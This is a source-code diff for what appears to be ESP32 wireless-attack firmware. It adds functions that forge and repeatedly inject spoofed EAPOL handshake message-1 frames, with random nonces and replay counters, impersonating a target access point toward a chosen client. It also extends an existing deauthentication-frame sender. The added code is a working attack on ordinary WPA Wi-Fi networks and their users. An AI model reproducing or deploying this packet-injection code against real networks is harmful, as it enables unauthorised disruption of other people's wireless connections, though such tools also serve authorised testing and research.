@@ -1,3 +1,4 @@
+#include "esp_random.h"
 #include "WiFiScan.h"
 #include "lang_var.h"
 
@@ -6413,6 +6414,90 @@ void WiFiScan::sendDeauthFrame(uint8_t bssid[6], int channel, String dst_mac_str
   esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
   esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
   esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+
+  packets_sent = packets_sent + 3;
+}
+
+void WiFiScan::sendEapolBagMsg1(uint8_t bssid[6], int channel, uint8_t mac[6]) {
+  WiFiScan::set_channel = channel;
+  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+  delay(1);
+
+  // Build packet
+  eapol_packet_bad_msg1[4] = mac[0];
+  eapol_packet_bad_msg1[5] = mac[1];
+  eapol_packet_bad_msg1[6] = mac[2];
+  eapol_packet_bad_msg1[7] = mac[3];
+  eapol_packet_bad_msg1[8] = mac[4];
+  eapol_packet_bad_msg1[9] = mac[5];
+
+  eapol_packet_bad_msg1[10] = bssid[0];
+  eapol_packet_bad_msg1[11] = bssid[1];
+  eapol_packet_bad_msg1[12] = bssid[2];
+  eapol_packet_bad_msg1[13] = bssid[3];
+  eapol_packet_bad_msg1[14] = bssid[4];
+  eapol_packet_bad_msg1[15] = bssid[5];
+
+  eapol_packet_bad_msg1[16] = bssid[0];
+  eapol_packet_bad_msg1[17] = bssid[1];
+  eapol_packet_bad_msg1[18] = bssid[2];
+  eapol_packet_bad_msg1[19] = bssid[3];
+  eapol_packet_bad_msg1[20] = bssid[4];
+  eapol_packet_bad_msg1[21] = bssid[5]; 
+
+  /* Generate random Nonce */
+  for (uint8_t i = 0; i < 32; i++) {
+    eapol_packet_bad_msg1[49 + i] = esp_random() & 0xFF;
+  }
+  /* Update replay counter */
+  for (uint8_t i = 0; i < 8; i++) {
+    eapol_packet_bad_msg1[41 + i] = (packets_sent >> (56 - i * 8)) & 0xFF;
+  }
+
+  // Send packet
+  esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
+  esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
+  esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
+
+  packets_sent = packets_sent + 3;
+}
+
+void WiFiScan::sendEapolBagMsg1(uint8_t bssid[6], int channel, String dst_mac_str) {
+  WiFiScan::set_channel = channel;
+  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+  delay(1);
+
+  // Build packet
+  sscanf(dst_mac_str.c_str(), "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", 
+        &eapol_packet_bad_msg1[4], &eapol_packet_bad_msg1[5], &eapol_packet_bad_msg1[6], &eapol_packet_bad_msg1[7], &eapol_packet_bad_msg1[8], &eapol_packet_bad_msg1[9]);
+  
+  eapol_packet_bad_msg1[10] = bssid[0];
+  eapol_packet_bad_msg1[11] = bssid[1];
+  eapol_packet_bad_msg1[12] = bssid[2];
+  eapol_packet_bad_msg1[13] = bssid[3];
+  eapol_packet_bad_msg1[14] = bssid[4];
+  eapol_packet_bad_msg1[15] = bssid[5];
+
+  eapol_packet_bad_msg1[16] = bssid[0];
+  eapol_packet_bad_msg1[17] = bssid[1];
+  eapol_packet_bad_msg1[18] = bssid[2];
+  eapol_packet_bad_msg1[19] = bssid[3];
+  eapol_packet_bad_msg1[20] = bssid[4];
+  eapol_packet_bad_msg1[21] = bssid[5]; 
+  
+  /* Generate random Nonce */
+  for (uint8_t i = 0; i < 32; i++) {
+    eapol_packet_bad_msg1[49 + i] = esp_random() & 0xFF;
+  }
+  /* Update replay counter */
+  for (uint8_t i = 0; i < 8; i++) {
+    eapol_packet_bad_msg1[41 + i] = (packets_sent >> (56 - i * 8)) & 0xFF;
+  }
+
+  // Send packet
+  esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
+  esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
+  esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
 
   packets_sent = packets_sent + 3;
 }
